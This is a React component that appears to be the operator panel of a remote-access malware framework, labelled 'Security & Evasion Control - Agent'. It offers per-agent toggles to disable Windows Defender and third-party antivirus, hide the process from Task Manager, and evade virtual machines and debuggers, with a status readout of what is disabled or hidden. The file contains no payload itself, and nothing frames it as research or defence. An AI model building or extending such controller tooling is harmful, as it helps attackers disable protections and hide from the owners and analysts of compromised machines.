import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { 
  Shield, 
  ShieldOff, 
  Eye, 
  EyeOff, 
  Lock, 
  Unlock,
  AlertTriangle,
  CheckCircle,
  XCircle,
  Settings
} from 'lucide-react';

interface SecurityControlPanelProps {
  agentId: string;
  security: {
    defenderDisabled: boolean;
    avDisabled: boolean;
    processHidden: boolean;
    antiVm: boolean;
    antiDebug: boolean;
  };
  onSecurityAction: (action: string, params?: any) => void;
}

const SecurityControlPanel: React.FC<SecurityControlPanelProps> = ({
  agentId,
  security,
  onSecurityAction
}) => {
  const [activeTab, setActiveTab] = useState('defender');

  const SecurityToggle = ({ 
    label, 
    description, 
    active, 
    action, 
    riskLevel = 'medium' 
  }: {
    label: string;
    description: string;
    active: boolean;
    action: string;
    riskLevel?: 'low' | 'medium' | 'high';
  }) => (
    <div className="space-y-3">
      <div className="flex items-center justify-between">
        <div className="space-y-1">
          <div className="flex items-center gap-2">
            <span className="font-medium">{label}</span>
            <Badge variant={active ? "destructive" : "secondary"}>
              {active ? "Active" : "Inactive"}
            </Badge>
            <Badge variant="outline" className={
              riskLevel === 'high' ? 'border-red-500 text-red-500' :
              riskLevel === 'medium' ? 'border-yellow-500 text-yellow-500' :
              'border-green-500 text-green-500'
            }>
              {riskLevel.toUpperCase()}
            </Badge>
          </div>
          <p className="text-sm text-muted-foreground">{description}</p>
        </div>
        <Button
          variant={active ? "outline" : "default"}
          size="sm"
          onClick={() => onSecurityAction(action, { enable: !active })}
        >
          {active ? "Disable" : "Enable"}
        </Button>
      </div>
    </div>
  );

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <Shield className="w-5 h-5" />
          Security & Evasion Control - Agent {agentId}
        </CardTitle>
      </CardHeader>
      <CardContent>
        <Tabs value={activeTab} onValueChange={setActiveTab}>
          <TabsList className="grid w-full grid-cols-3">
            <TabsTrigger value="defender">Defender/AV</TabsTrigger>
            <TabsTrigger value="stealth">Stealth</TabsTrigger>
            <TabsTrigger value="analysis">Anti-Analysis</TabsTrigger>
          </TabsList>

          <TabsContent value="defender" className="mt-4 space-y-4">
            <Alert>
              <AlertTriangle className="h-4 w-4" />
              <AlertDescription>
                Disabling security software may trigger alerts. Use with caution.
              </AlertDescription>
            </Alert>

            <SecurityToggle
              label="Windows Defender"
              description="Disable Windows Defender real-time protection and scanning"
              active={security.defenderDisabled}
              action="toggle_defender"
              riskLevel="high"
            />

            <Separator />

            <SecurityToggle
              label="Antivirus Software"
              description="Attempt to disable third-party antivirus solutions"
              active={security.avDisabled}
              action="toggle_av"
              riskLevel="high"
            />
          </TabsContent>

          <TabsContent value="stealth" className="mt-4 space-y-4">
            <SecurityToggle
              label="Process Hiding"
              description="Hide process from Task Manager and process lists"
              active={security.processHidden}
              action="toggle_process_hiding"
              riskLevel="medium"
            />
          </TabsContent>

          <TabsContent value="analysis" className="mt-4 space-y-4">
            <SecurityToggle
              label="Anti-VM Detection"
              description="Detect and evade virtual machine environments"
              active={security.antiVm}
              action="toggle_anti_vm"
              riskLevel="low"
            />

            <Separator />

            <SecurityToggle
              label="Anti-Debug Detection"
              description="Detect and evade debugging attempts"
              active={security.antiDebug}
              action="toggle_anti_debug"
              riskLevel="low"
            />
          </TabsContent>
        </Tabs>

        <Separator className="my-4" />

        <div className="grid grid-cols-2 gap-4 text-sm">
          <div className="flex items-center gap-2">
            {security.defenderDisabled ? 
              <ShieldOff className="w-4 h-4 text-red-500" /> : 
              <Shield className="w-4 h-4 text-green-500" />
            }
            <span>Defender: {security.defenderDisabled ? 'Disabled' : 'Active'}</span>
          </div>
          <div className="flex items-center gap-2">
            {security.processHidden ? 
              <EyeOff className="w-4 h-4 text-green-500" /> : 
              <Eye className="w-4 h-4 text-red-500" />
            }
            <span>Process: {security.processHidden ? 'Hidden' : 'Visible'}</span>
          </div>
        </div>
      </CardContent>
    </Card>
  );
};

export default SecurityControlPanel;